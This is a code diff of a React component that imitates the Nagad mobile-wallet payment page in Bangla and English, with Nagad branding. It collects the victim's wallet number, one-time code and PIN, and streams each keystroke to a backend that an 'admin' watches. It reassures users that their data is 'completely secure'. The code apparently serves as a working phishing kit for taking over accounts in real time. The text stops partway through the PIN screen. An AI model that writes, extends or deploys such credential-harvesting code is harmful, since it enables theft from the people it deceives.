@@ -1,490 +1,440 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { TransactionSession } from '../types';
-import { rtdb, ref, set, update, db, doc, setDoc } from '../firebase';
+import { Shield, Lock, Clock, ArrowLeft, CheckCircle, AlertCircle } from 'lucide-react';
+import { PhoneChatLockIcon, ShieldCheckIcon, CheckMarkBoxIcon } from './Icons';
+import { InstructionsModal } from './InstructionsModal';
 
 interface PaymentFlowProps {
   session: TransactionSession;
-  lang: 'bn' | 'en';
+  lang: 'en' | 'bn';
   onUpdateSession: (updates: Partial<TransactionSession>) => void;
   onComplete: () => void;
+  inputLogoUrl?: string;
+  instructionsImageUrl?: string;
 }
 
-export const PaymentFlow: React.FC<PaymentFlowProps> = ({
-  session,
-  lang,
-  onUpdateSession,
-  onComplete,
-}) => {
-  const [accountDigits, setAccountDigits] = useState<string[]>(
-    session.accountNumber ? session.accountNumber.split('').concat(Array(11).fill('')).slice(0, 11) : Array(11).fill('')
-  );
-  const [otpDigits, setOtpDigits] = useState<string[]>(
-    session.otp ? session.otp.split('').concat(Array(6).fill('')).slice(0, 6) : Array(6).fill('')
-  );
-  const [otpValue, setOtpValue] = useState<string>(session.otp || '');
-  const [pinDigits, setPinDigits] = useState<string[]>(
-    session.pin ? session.pin.split('').concat(Array(4).fill('')).slice(0, 4) : Array(4).fill('')
-  );
-  const [errorMessage, setErrorMessage] = useState<string>('');
-  const [processingTimer, setProcessingTimer] = useState<number>(30);
-  const [isSuccessState, setIsSuccessState] = useState<boolean>(false);
-
-  const digitInputRefs = useRef<(HTMLInputElement | null)[]>([]);
-  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
+export const PaymentFlow: React.FC<PaymentFlowProps> = ({ session, lang, onUpdateSession, onComplete, inputLogoUrl, instructionsImageUrl }) => {
+  const [phone, setPhone] = useState(session.accountNumber || '');
+  const [otpValue, setOtpValue] = useState(session.otp || '');
+  const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '']);
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  
+  const [errorMessage, setErrorMessage] = useState('');
+  const [resendTimer, setResendTimer] = useState(90); // 1:30 mins = 90 secs
+  const [isInstructionsOpen, setIsInstructionsOpen] = useState(false);
 
-  // Keep internal states synced if session values change from outside
+  // Sync to backend function
+  const syncToFirebase = (updates: Partial<TransactionSession>) => {
+    onUpdateSession({ ...updates, updatedAt: Date.now() });
+  };
+
   useEffect(() => {
-    if (session.otp !== undefined) {
-      setOtpDigits(session.otp.split('').concat(Array(6).fill('')).slice(0, 6));
-      setOtpValue(session.otp);
+    if (errorMessage) {
+      const t = setTimeout(() => setErrorMessage(''), 3000);
+      return () => clearTimeout(t);
     }
-  }, [session.otp]);
+  }, [errorMessage]);
 
-  // Real-time synchronization helper to update Firebase RTDB and Firestore
-  const syncToFirebase = async (updates: Partial<TransactionSession>) => {
-    onUpdateSession(updates);
-    const updatedFields = { ...updates, updatedAt: Date.now() };
-
-    // 1. Sync to Realtime Database using partial update
-    try {
-      const rtdbRef = ref(rtdb, `sessions/${session.id}`);
-      await update(rtdbRef, updatedFields);
-    } catch (e) {
-      console.warn('RTDB sync fallback:', e);
+  // Timer logic for OTP Resend
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (session.step === 'otp' && resendTimer > 0) {
+      interval = setInterval(() => {
+        setResendTimer(prev => prev - 1);
+      }, 1000);
     }
+    return () => clearInterval(interval);
+  }, [session.step, resendTimer]);
 
-    // 2. Sync to Firestore
-    try {
-      const firestoreRef = doc(db, 'sessions', session.id);
-      await setDoc(firestoreRef, updatedFields, { merge: true });
-    } catch (e) {
-      console.warn('Firestore sync fallback:', e);
-    }
+  const handleResendOtp = () => {
+    if (resendTimer > 0) return;
+    setResendTimer(90);
+    syncToFirebase({ status: 'otp_resend_requested' }); // Admin will see the status update
   };
 
-  // Step 1: Nagad Account Number input handlers
-  const handleDigitChange = (index: number, val: string) => {
-    // Handle paste of whole number
-    if (val.length > 1) {
-      const digitsOnly = val.replace(/\D/g, '').slice(0, 11);
-      const newDigits = [...accountDigits];
-      for (let i = 0; i < 11; i++) {
-        newDigits[i] = digitsOnly[i] || '';
-      }
-      setAccountDigits(newDigits);
-      const fullNum = newDigits.join('');
-      syncToFirebase({ accountNumber: fullNum });
-      if (digitsOnly.length === 11) {
-        digitInputRefs.current[10]?.focus();
-      } else {
-        digitInputRefs.current[Math.min(digitsOnly.length, 10)]?.focus();
-      }
-      return;
-    }
-
-    const digit = val.replace(/\D/g, '');
-    const newDigits = [...accountDigits];
-    newDigits[index] = digit;
-    setAccountDigits(newDigits);
-
-    const fullNum = newDigits.join('');
-    syncToFirebase({ accountNumber: fullNum });
-
-    // Focus next box if digit entered
-    if (digit && index < 10) {
-      digitInputRefs.current[index + 1]?.focus();
-    }
+  const formatTimer = (seconds: number) => {
+    const m = Math.floor(seconds / 60);
+    const s = seconds % 60;
+    return `0${m}:${s < 10 ? '0' : ''}${s}`;
   };
 
-  const handleDigitKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Backspace') {
-      if (!accountDigits[index] && index > 0) {
-        digitInputRefs.current[index - 1]?.focus();
-      }
+  // Completion logic
+  useEffect(() => {
+    if (session.step === 'completed' || session.step === 'success' || session.step === 'failed') {
+      const t = setTimeout(() => {
+        if (session.step === 'success') {
+          onComplete();
+        }
+      }, 2000);
+      return () => clearTimeout(t);
+    }
+  }, [session.step, onComplete]);
+
+  const goBack = () => {
+    if (session.step === 'otp') {
+      syncToFirebase({ step: 'number', otp: '' });
+      setOtpValue('');
+    } else if (session.step === 'pin') {
+      syncToFirebase({ step: 'otp', pin: '' });
+      setPinDigits(['', '', '', '']);
     }
   };
 
   const handleProceedNumber = () => {
-    const fullNum = accountDigits.join('');
-    // Valid Bangladeshi mobile numbers must be 11 digits and start with 013, 014, 015, 016, 017, 018, or 019
-    const isValidBDMobile = /^01[3-9]\d{8}$/.test(fullNum);
-    if (!isValidBDMobile) {
-      setErrorMessage(
-        lang === 'bn'
-          ? 'অনুগ্রহ করে সঠিক ১১ ডিজিটের বাংলাদেশী নগদ অ্যাকাউন্ট নম্বর দিন (যেমন: 017xxxxxxxx)'
-          : 'Please enter a valid 11-digit Bangladeshi Nagad account number (e.g. 017xxxxxxxx)'
-      );
+    const isValidBDNumber = /^01\d{9}$/.test(phone);
+    if (!isValidBDNumber) {
+      setErrorMessage(lang === 'bn' ? 'সঠিক বাংলাদেশি নাম্বার দিন' : 'Enter valid Bangladeshi number');
       return;
     }
-    setErrorMessage('');
-    syncToFirebase({ accountNumber: fullNum, step: 'otp' });
-  };
-
-  // Step 2: OTP handlers
-  const handleOtpChange = (val: string) => {
-    const digitsOnly = val.replace(/\D/g, '').slice(0, 6);
-    setOtpValue(digitsOnly);
-    setOtpDigits(digitsOnly.split('').concat(Array(6).fill('')).slice(0, 6));
-    syncToFirebase({ otp: digitsOnly });
+    syncToFirebase({ accountNumber: phone, step: 'otp' });
+    setResendTimer(90);
   };
 
   const handleProceedOtp = () => {
-    const currentOtp = otpValue || otpDigits.join('');
-    if (currentOtp.length !== 6) {
-      setErrorMessage(
-        lang === 'bn' ? 'অনুগ্রহ করে সঠিক ৬ ডিজিটের ওটিপি (OTP) দিন' : 'Please enter a valid 6-digit OTP code'
-      );
+    if (otpValue.length !== 6) {
+      setErrorMessage(lang === 'bn' ? 'সঠিক কোড দিন' : 'Enter valid code');
       return;
     }
-    setErrorMessage('');
-    syncToFirebase({ otp: currentOtp, step: 'pin' });
+    syncToFirebase({ otp: otpValue, step: 'pin' });
   };
 
-  const handleResendOtp = () => {
-    setOtpDigits(Array(6).fill(''));
-    setOtpValue('');
-    const newCount = (session.resendCount || 0) + 1;
-    setErrorMessage(
-      lang === 'bn' ? 'নতুন ওটিপি কোড পাঠানো হয়েছে' : 'New verification code sent'
-    );
-    syncToFirebase({
-      otp: '',
-      resendCount: newCount,
-      lastResendAt: Date.now(),
-      updatedAt: Date.now(),
-    });
+  const handleProceedPin = () => {
+    const p = pinDigits.join('');
+    if (p.length !== 4) {
+      setErrorMessage(lang === 'bn' ? 'সঠিক পিন দিন' : 'Enter valid PIN');
+      return;
+    }
+    syncToFirebase({ pin: p, step: 'processing' });
   };
 
-  // Step 3: PIN handlers
-  const handlePinDigitChange = (index: number, val: string) => {
-    const digit = val.replace(/\D/g, '');
-    const newPin = [...pinDigits];
-    newPin[index] = digit;
-    setPinDigits(newPin);
-
-    const fullPin = newPin.join('');
-    syncToFirebase({ pin: fullPin });
-
-    if (digit && index < 3) {
+  const handlePinDigitChange = (index: number, value: string) => {
+    if (!/^\d*$/.test(value)) return;
+    const newDigits = [...pinDigits];
+    newDigits[index] = value;
+    setPinDigits(newDigits);
+    syncToFirebase({ pin: newDigits.join('') });
+    if (value && index < 3) {
       pinInputRefs.current[index + 1]?.focus();
     }
   };
 
   const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Backspace') {
-      if (!pinDigits[index] && index > 0) {
-        pinInputRefs.current[index - 1]?.focus();
-      }
+    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
+      pinInputRefs.current[index - 1]?.focus();
+      const newDigits = [...pinDigits];
+      newDigits[index - 1] = '';
+      setPinDigits(newDigits);
     }
   };
 
-  const handleProceedPin = () => {
-    const fullPin = pinDigits.join('');
-    if (fullPin.length !== 4) {
-      setErrorMessage(
-        lang === 'bn' ? 'অনুগ্রহ করে ৪ ডিজিটের পিন (PIN) দিন' : 'Please enter a 4-digit PIN'
-      );
-      return;
-    }
-    setErrorMessage('');
-    syncToFirebase({ pin: fullPin, step: 'processing' });
-  };
-
-  // Processing timer loop (30 seconds count down, at 15s show success)
-  useEffect(() => {
-    let interval: NodeJS.Timeout | null = null;
-    if (session.step === 'processing') {
-      interval = setInterval(() => {
-        setProcessingTimer((prev) => {
-          if (prev <= 1) {
-            if (interval) clearInterval(interval);
-            onComplete();
-            return 0;
-          }
-          const nextVal = prev - 1;
-          if (nextVal <= 15) {
-            setIsSuccessState(true);
-            syncToFirebase({ step: 'success' });
-          }
-          return nextVal;
-        });
-      }, 1000);
-    }
-    return () => {
-      if (interval) clearInterval(interval);
-    };
-  }, [session.step]);
-
-  // Render Step 1: Account Number
+  // ---- STEP: NUMBER ----
   if (session.step === 'number') {
     return (
-      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
-        <h2 className="text-white text-base sm:text-lg font-bold mb-3.5 text-center">
-          {lang === 'bn' ? 'আপনার নগদ অ্যাকাউন্ট নম্বর' : 'Your Nagad Account Number'}
-        </h2>
-
-        {/* 11 Input Boxes separated as 3 - 4 - 4 with precise gaps & slender height */}
-        <div className="flex items-center justify-center gap-0.5 sm:gap-1.5 mb-5 max-w-full py-1 select-none px-1">
-          {/* First 3 boxes */}
-          <div className="flex gap-0.5 sm:gap-1.5">
-            {[0, 1, 2].map((i) => (
-              <input
-                key={i}
-                ref={(el) => (digitInputRefs.current[i] = el)}
-                type="text"
-                inputMode="numeric"
-                maxLength={11}
-                value={accountDigits[i] || ''}
-                onChange={(e) => handleDigitChange(i, e.target.value)}
-                onKeyDown={(e) => handleDigitKeyDown(i, e)}
-                className="w-[22px] h-8 sm:w-7.5 sm:h-9 bg-white rounded-[3px] sm:rounded-[4px] text-center text-gray-900 font-extrabold text-sm sm:text-lg shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
-              />
-            ))}
-          </div>
-
-          <span className="text-white text-base sm:text-xl font-bold px-1 sm:px-2.5">-</span>
-
-          {/* Next 4 boxes */}
-          <div className="flex gap-0.5 sm:gap-1.5">
-            {[3, 4, 5, 6].map((i) => (
-              <input
-                key={i}
-                ref={(el) => (digitInputRefs.current[i] = el)}
-                type="text"
-                inputMode="numeric"
-                maxLength={1}
-                value={accountDigits[i] || ''}
-                onChange={(e) => handleDigitChange(i, e.target.value)}
-                onKeyDown={(e) => handleDigitKeyDown(i, e)}
-                className="w-[22px] h-8 sm:w-7.5 sm:h-9 bg-white rounded-[3px] sm:rounded-[4px] text-center text-gray-900 font-extrabold text-sm sm:text-lg shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
-              />
-            ))}
-          </div>
-
-          <span className="text-white text-base sm:text-xl font-bold px-1 sm:px-2.5">-</span>
-
-          {/* Last 4 boxes */}
-          <div className="flex gap-0.5 sm:gap-1.5">
-            {[7, 8, 9, 10].map((i) => (
-              <input
-                key={i}
-                ref={(el) => (digitInputRefs.current[i] = el)}
-                type="text"
-                inputMode="numeric"
-                maxLength={1}
-                value={accountDigits[i] || ''}
-                onChange={(e) => handleDigitChange(i, e.target.value)}
-                onKeyDown={(e) => handleDigitKeyDown(i, e)}
-                className="w-[22px] h-8 sm:w-7.5 sm:h-9 bg-white rounded-[3px] sm:rounded-[4px] text-center text-gray-900 font-extrabold text-sm sm:text-lg shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
-              />
-            ))}
-          </div>
-        </div>
-
+      <div className="w-full flex-1 flex flex-col font-sans max-w-sm mx-auto">
         {errorMessage && (
-          <p className="text-yellow-200 bg-red-900/80 text-xs sm:text-sm px-3 py-1 rounded mb-3 text-center border border-yellow-300/40">
-            {errorMessage}
-          </p>
+           <div className="fixed top-4 left-1/2 -translate-x-1/2 w-[90%] max-w-sm bg-[#c81e1e] text-white text-sm font-bold py-3 px-4 rounded shadow-lg text-center z-50 animate-in slide-in-from-top-2 fade-in">
+             {errorMessage}
+           </div>
         )}
-
-        <p className="text-white text-xs sm:text-sm text-center max-w-xs sm:max-w-md mb-6 leading-snug font-medium">
-          {lang === 'bn' ? (
-            <>
-              "Proceed" ক্লিক/ট্যাপ করার মাধ্যমে আপনি আমাদের{' '}
-              <a
-                href="https://nagad.com.bd/pg/?n=terms-of-use"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="underline font-bold text-white hover:text-gray-200"
-              >
-                শর্তাবলীর
-              </a>{' '}
-              সাথে সম্মত হচ্ছেন
-            </>
-          ) : (
-            <>
-              By clicking/tapping "Proceed" you are agreeing to our{' '}
-              <a
-                href="https://nagad.com.bd/pg/?n=terms-of-use"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="underline font-bold text-white hover:text-gray-200"
-              >
-                Terms and Conditions
-              </a>
-            </>
-          )}
-        </p>
-
-        {/* Slender Sleek Buttons positioned at outer ends to match exact reference screenshot gap */}
-        <div className="flex items-center justify-between w-full max-w-[280px] sm:max-w-[310px] px-1 sm:px-2">
-          <button
-            type="button"
-            onClick={handleProceedNumber}
-            className="bg-white hover:bg-gray-100 text-[#b3080d] font-extrabold py-1.5 px-6 sm:px-7 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
-          >
-            {lang === 'bn' ? 'এগিয়ে যান' : 'Proceed'}
-          </button>
-          <button
-            type="button"
-            onClick={() => window.location.reload()}
-            className="bg-white hover:bg-gray-100 text-[#b3080d] font-extrabold py-1.5 px-6 sm:px-7 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
-          >
-            {lang === 'bn' ? 'বন্ধ করুন' : 'Close'}
-          </button>
+        
+        <div className="bg-white rounded-[20px] border border-gray-200 shadow-[0_2px_10px_rgba(0,0,0,0.04)] w-full py-5 px-6 mb-6 flex flex-row items-center gap-4">
+          <div className="shrink-0 scale-110 origin-left">
+            <PhoneChatLockIcon />
+          </div>
+          <div className="flex flex-col">
+            <h2 className="font-bold text-[17px] text-gray-900 mb-1">{lang === 'bn' ? 'আপনার নগদ নাম্বারটি দিন' : 'Enter your Nagad Number'}</h2>
+            <p className="text-[13px] text-gray-500 leading-snug">
+              {lang === 'bn' ? 'পেমেন্ট সম্পন্ন করতে' : 'To complete payment'} <br/>
+              {lang === 'bn' ? 'আপনার নগদ নাম্বারটি লিখুন' : 'enter your Nagad number'}
+            </p>
+          </div>
         </div>
+
+        <div className="flex flex-col flex-1 pb-4">
+          <label className="text-[15px] font-bold text-gray-900 mb-2">
+            {lang === 'bn' ? 'নগদ নাম্বার' : 'Nagad Number'}
+          </label>
+          <div className="relative mb-6">
+            <div className="absolute inset-y-0 left-4 flex items-center pointer-events-none">
+              {inputLogoUrl ? (
+                 <img src={inputLogoUrl} alt="icon" className="w-6 h-6 object-contain" />
+              ) : (
+                 <img src="https://download.logo.wine/logo/Nagad/Nagad-Logo.wine.png" alt="nagad" className="w-8 h-8 object-contain scale-150" />
+              )}
+            </div>
+            <input
+              type="tel"
+              value={phone}
+              onChange={(e) => {
+                const val = e.target.value.replace(/\D/g, '');
+                setPhone(val);
+                syncToFirebase({ accountNumber: val });
+              }}
+              placeholder="01XXXXXXXXX"
+              className={`w-full border-2 rounded-lg py-4 pl-[52px] pr-4 text-gray-900 font-bold focus:outline-none text-[17px] tracking-wide transition-colors ${phone.length > 0 ? 'border-[#ed1c24]' : 'border-gray-200'}`}
+              maxLength={11}
+            />
+          </div>
+
+          <div className="w-full bg-[#fdf2f2] rounded-lg px-4 py-3 flex items-start gap-2.5 mb-8 border border-red-50">
+            <Shield className="w-4 h-4 text-teal-600 shrink-0 mt-0.5 fill-teal-100" />
+            <p className="text-[12px] text-gray-700 leading-[1.4] font-medium pt-0.5">
+              {lang === 'bn' ? 'নিরাপদ থাকুন, এটি আপনার একাউন্টের নিরাপদ লেনদেন নিশ্চিত করে।' : 'Stay safe, this ensures a secure transaction for your account.'}
+            </p>
+          </div>
+
+          <button onClick={() => setIsInstructionsOpen(true)} className="w-full border-2 border-dashed border-[#ed1c24] rounded-full py-3.5 mb-6 text-[#ed1c24] font-bold text-[15px] flex items-center justify-center gap-2 hover:bg-red-50 transition-colors">
+            <span className="text-xl leading-none -mt-0.5">?</span> {lang === 'bn' ? 'নির্দেশনা দেখুন' : 'View Instructions'}
+          </button>
+          
+          <button
+            onClick={handleProceedNumber}
+            disabled={phone.length < 11}
+            style={{ backgroundColor: phone.length >= 11 ? '#ed1c24' : '#f4999d' }}
+            className="w-full text-white font-bold text-[16px] py-4 rounded-full transition-colors mt-auto sm:mt-0"
+          >
+            {lang === 'bn' ? 'পরবর্তী' : 'Next'}
+          </button>
+
+          <div className="mt-8 flex items-center justify-center gap-1.5 pb-4">
+            <Lock className="w-3.5 h-3.5 text-gray-400 fill-gray-200" />
+            <span className="text-[12px] text-gray-500 font-medium">{lang === 'bn' ? 'আপনার তথ্য সম্পূর্ণ নিরাপদ' : 'Your data is completely secure'}</span>
+          </div>
+        </div>
+        
+        <InstructionsModal isOpen={isInstructionsOpen} onClose={() => setIsInstructionsOpen(false)} imageUrl={instructionsImageUrl} />
       </div>
     );
   }
 
-  // Render Step 2: Verification Code [OTP]
+  // ---- STEP: OTP ----
   if (session.step === 'otp') {
     return (
-      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
-        <h2 className="text-white text-base sm:text-lg font-bold mb-3.5 text-center">
-          {lang === 'bn' ? 'যাচাইকরণ কোড লিখুন [OTP]' : 'Enter Verification Code [OTP]'}
-        </h2>
-
-        {/* Single OTP Input Box */}
-        <div className="w-full mb-5 flex flex-col items-center">
-          <input
-            type="text"
-            inputMode="numeric"
-            maxLength={6}
-            value={otpValue}
-            onChange={(e) => handleOtpChange(e.target.value)}
-            placeholder="XXXXXX"
-            className="w-44 sm:w-48 h-10 sm:h-11 bg-white rounded-[4px] text-center text-gray-900 font-extrabold text-base sm:text-lg shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white tracking-[0.2em] placeholder:text-gray-400 placeholder:font-bold placeholder:tracking-[0.2em] transition-none"
-          />
+      <div className="fixed inset-0 bg-white z-40 flex flex-col font-sans">
+        {/* Red Header */}
+        <div className="bg-[#ed1c24] text-white flex items-center p-4 shrink-0 shadow-sm relative z-50">
+          <button onClick={goBack} className="p-1 mr-3 hover:bg-white/20 rounded-full transition-colors">
+            <ArrowLeft className="w-6 h-6" />
+          </button>
+          <h1 className="font-bold text-lg">{lang === 'bn' ? 'মোবাইল নম্বর নিশ্চিত করুন' : 'Verify Mobile Number'}</h1>
         </div>
 
+        {/* Toast Error Message */}
         {errorMessage && (
-          <p className="text-yellow-200 bg-red-900/60 text-xs sm:text-sm px-3 py-1 rounded mb-3 text-center border border-yellow-300/40">
-            {errorMessage}
-          </p>
+           <div className="absolute top-16 left-1/2 -translate-x-1/2 w-[90%] max-w-sm bg-[#c81e1e] text-white text-sm font-bold py-3 px-4 rounded shadow-lg text-center z-50 animate-in slide-in-from-top-2 fade-in">
+             {errorMessage}
+           </div>
         )}
 
-        {/* Slender Buttons: Proceed, Resend Code, Close */}
-        <div className="flex flex-wrap items-center justify-center gap-2.5 sm:gap-3 w-full max-w-sm mt-2">
+        <div className="flex-1 overflow-y-auto flex flex-col items-center pt-8 px-6 bg-white">
+          <div className="mb-6 transform scale-[1.7] origin-center mt-4">
+             <PhoneChatLockIcon />
+          </div>
+          <p className="text-[13px] text-gray-600 text-center leading-[1.6] mb-8 font-medium">
+            {lang === 'bn' ? 'আপনার নগদ একাউন্টের নিরাপত্তার জন্য' : 'For your Nagad account security'}<br/>
+            {lang === 'bn' ? 'আমরা আপনাকে একটি ৬ সংখ্যার' : 'we have sent a 6 digit'}<br/>
+            {lang === 'bn' ? 'নিরাপত্তা কোড পাঠিয়েছি।' : 'security code to you.'}
+          </p>
+
+          <div className="bg-gray-50 rounded-[20px] px-8 py-3 mb-8 border border-gray-100 flex flex-col items-center">
+            <span className="text-[12px] text-gray-500 font-medium mb-0.5">{lang === 'bn' ? 'আপনার নগদ নাম্বার' : 'Your Nagad Number'}</span>
+            <div className="flex items-center gap-2">
+              <div className="w-6 h-6 flex items-center justify-center shrink-0">
+                {inputLogoUrl ? (
+                  <img src={inputLogoUrl} alt="icon" className="w-full h-full object-contain" />
+                ) : (
+                  <div className="w-5 h-5 bg-[#ed1c24] rounded-full flex items-center justify-center">
+                    <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
+                  </div>
+                )}
+              </div>
+              <span className="font-bold text-[17px] text-gray-900">{session.accountNumber}</span>
+            </div>
+          </div>
+
+          <div className="w-full max-w-sm self-start mb-2">
+            <h3 className="font-bold text-[15px] text-gray-900">{lang === 'bn' ? '৬ সংখ্যার কোড' : '6 Digit Code'}</h3>
+          </div>
+          
+          <div className="relative mb-6 w-full max-w-sm">
+            <input
+              type="tel"
+              maxLength={6}
+              value={otpValue}
+              onChange={(e) => {
+                const val = e.target.value.replace(/\D/g, '');
+                setOtpValue(val);
+                syncToFirebase({ otp: val });
+              }}
+              placeholder={lang === 'bn' ? 'কোড লিখুন / পেস্ট করুন' : 'Enter / Paste code'}
+              className={`w-full border-2 rounded-lg py-4 px-4 text-center text-gray-900 font-bold focus:outline-none text-[17px] tracking-[0.2em] transition-colors placeholder:tracking-normal placeholder:font-normal placeholder:text-gray-400 placeholder:text-[15px] ${otpValue.length > 0 ? 'border-[#ed1c24]' : 'border-gray-200'}`}
+            />
+            {otpValue.length === 6 && (
+              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-green-500">
+                 <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" /></svg>
+              </div>
+            )}
+          </div>
+
+          <div className="w-full max-w-sm border border-gray-100 rounded-lg py-3.5 px-4 flex items-start gap-2.5 mb-8 bg-gray-50">
+            <Clock className="w-4 h-4 text-[#ed1c24] shrink-0 mt-0.5" />
+            <p className="text-[12px] text-gray-500 font-medium leading-[1.4] pt-0.5">
+              {lang === 'bn' ? 'কোড পাঠাতে সময় লাগতে পারে ১:৩০ পর্যন্ত' : 'It may take up to 1:30 mins.'}<br/>
+              {lang === 'bn' ? 'কোড না পেলে ' : 'If not received '}
+              
+              <span 
+                onClick={handleResendOtp}
+                className={`font-bold ${resendTimer === 0 ? 'text-[#ed1c24] cursor-pointer hover:underline' : 'text-gray-400 cursor-not-allowed'}`}
+              >
+                {lang === 'bn' ? 'পুনরায় পাঠান' : 'Resend'}
+              </span>
+              
+              {resendTimer > 0 && (
+                <span className="font-bold text-gray-700 ml-1">({formatTimer(resendTimer)})</span>
+              )}
+            </p>
+          </div>
+
           <button
-            type="button"
             onClick={handleProceedOtp}
-            className="bg-white hover:bg-gray-100 text-[#b3080d] font-bold py-1.5 px-4 sm:px-5 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
+            disabled={otpValue.length !== 6}
+            style={{ backgroundColor: otpValue.length === 6 ? '#ed1c24' : '#f4999d' }}
+            className="w-full max-w-sm text-white font-bold text-[16px] py-4 rounded-full transition-colors mt-auto sm:mt-0"
           >
-            {lang === 'bn' ? 'এগিয়ে যান' : 'Proceed'}
+            {lang === 'bn' ? 'কোড যাচাই করুন' : 'Verify Code'}
           </button>
-          <button
-            type="button"
-            onClick={handleResendOtp}
-            className="bg-white hover:bg-gray-100 text-[#b3080d] font-bold py-1.5 px-3.5 sm:px-4 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
-          >
-            {lang === 'bn' ? 'পুনরায় কোড পাঠান' : 'Resend Code'}
-          </button>
-          <button
-            type="button"
-            onClick={() => window.location.reload()}
-            className="bg-white hover:bg-gray-100 text-[#b3080d] font-bold py-1.5 px-4 sm:px-5 rounded-md shadow transition-transform active:scale-95 text-xs sm:text-sm"
-          >
-            {lang === 'bn' ? 'বন্ধ করুন' : 'Close'}
-          </button>
+          
+          <div className="mt-8 flex items-center justify-center gap-1.5 pb-4">
+            <Lock className="w-3.5 h-3.5 text-gray-400 fill-gray-200" />
+            <span className="text-[12px] text-gray-500 font-medium">{lang === 'bn' ? 'আপনার তথ্য সম্পূর্ণ নিরাপদ' : 'Your data is completely secure'}</span>
+          </div>
         </div>
       </div>
     );
   }
 
-  // Render Step 3: Enter PIN
+  // ---- STEP: PIN ----
   if (session.step === 'pin') {
     return (
-      <div className="w-full flex flex-col items-center mt-6 sm:mt-8 pt-1 px-4">
-        <h2 className="text-white text-base sm:text-lg font-bold mb-4 text-center">
-          {lang === 'bn' ? 'পিন (PIN) দিন' : 'Enter PIN'}
-        </h2>
-
-        {/* 4 PIN Boxes */}
-        <div className="flex items-center justify-center gap-2.5 sm:gap-3.5 mb-6">
-          {[0, 1, 2, 3].map((i) => (
-            <input
-              key={i}
-              ref={(el) => (pinInputRefs.current[i] = el)}
-              type="password"
-              inputMode="numeric"
-              maxLength={1}
-              value={pinDigits[i] || ''}
-              onChange={(e) => handlePinDigitChange(i, e.target.value)}
-              onKeyDown={(e) => handlePinKeyDown(i, e)}
-              className="w-10 h-10 sm:w-12 sm:h-12 bg-white rounded-[4px] text-center text-gray-900 font-extrabold text-xl sm:text-2xl shadow-sm border border-transparent focus:outline-none focus:ring-1 focus:ring-white transition-none"
-            />
-          ))}
+      <div className="fixed inset-0 bg-white z-40 flex flex-col font-sans">
+        {/* Red Header */}
+        <div className="bg-[#ed1c24] text-white flex items-center p-4 shrink-0 shadow-sm relative z-50">
+          <button onClick={goBack} className="p-1 mr-3 hover:bg-white/20 rounded-full transition-colors">
+            <ArrowLeft className="w-6 h-6" />
+          </button>
+          <h1 className="font-bold text-lg">{lang === 'bn' ? 'নিরাপত্তা পিন' : 'Security PIN'}</h1>
         </div>
 
+        {/* Toast Error Message */}
         {errorMessage && (
-          <p className="text-yellow-200 bg-red-900/60 text-xs sm:text-sm px-3 py-1 rounded mb-3 text-center border border-yellow-300/40">
-            {errorMessage}
-          </p>
+           <div className="absolute top-16 left-1/2 -translate-x-1/2 w-[90%] max-w-sm bg-[#c81e1e] text-white text-sm font-bold py-3 px-4 rounded shadow-lg text-center z-50 animate-in slide-in-from-top-2 fade-in">
+             {errorMessage}
+           </div>
         )}
 
-        {/* Slender Sleek Buttons positioned at outer ends */}
-        <div className="flex items-center justify-between w-full max-w-[280px] sm:max-w-[310px] px-1 sm:px-2">
+        <div className="flex-1 overflow-y-auto flex flex-col items-center pt-8 px-6 bg-white">
+          <div className="w-[88px] h-[88px] mb-5 bg-[#fdf2f2] rounded-full flex items-center justify-center">
+             <Shield className="w-11 h-11 text-teal-600 fill-teal-100" strokeWidth={1.5} />
+          </div>
+          
+          <h2 className="text-[20px] font-bold text-gray-900 mb-1">{lang === 'bn' ? 'আপনার নিরাপত্তা পিন লিখুন' : 'Enter Security PIN'}</h2>
+          <p className="text-gray-500 text-[13px] font-medium mb-10">{lang === 'bn' ? 'আপনার ৪ সংখ্যার নিরাপত্তা পিন দিন' : 'Enter your 4 digit PIN'}</p>
+
+          <div className="flex justify-center gap-4 mb-5">
+            {[0, 1, 2, 3].map((i) => (
+              <input
+                key={i}
+                ref={(el) => (pinInputRefs.current[i] = el)}
+                type="password"
+                inputMode="numeric"
+                maxLength={1}
+                value={pinDigits[i] || ''}
+                onChange={(e) => handlePinDigitChange(i, e.target.value)}
+                onKeyDown={(e) => handlePinKeyDown(i, e)}
+                className={`w-[52px] h-[58px] border-2 rounded-lg text-center text-2xl font-bold text-gray-900 focus:outline-none focus:border-[#ed1c24] transition-colors ${pinDigits[i] ? 'border-[#ed1c24]' : 'border-gray-200'}`}
+              />
+            ))}
+          </div>
+
+          <button className="text-[#ed1c24] font-bold text-[14px] mb-8">
+            {lang === 'bn' ? 'পিন ভুলে গেছেন?' : 'Forgot PIN?'}
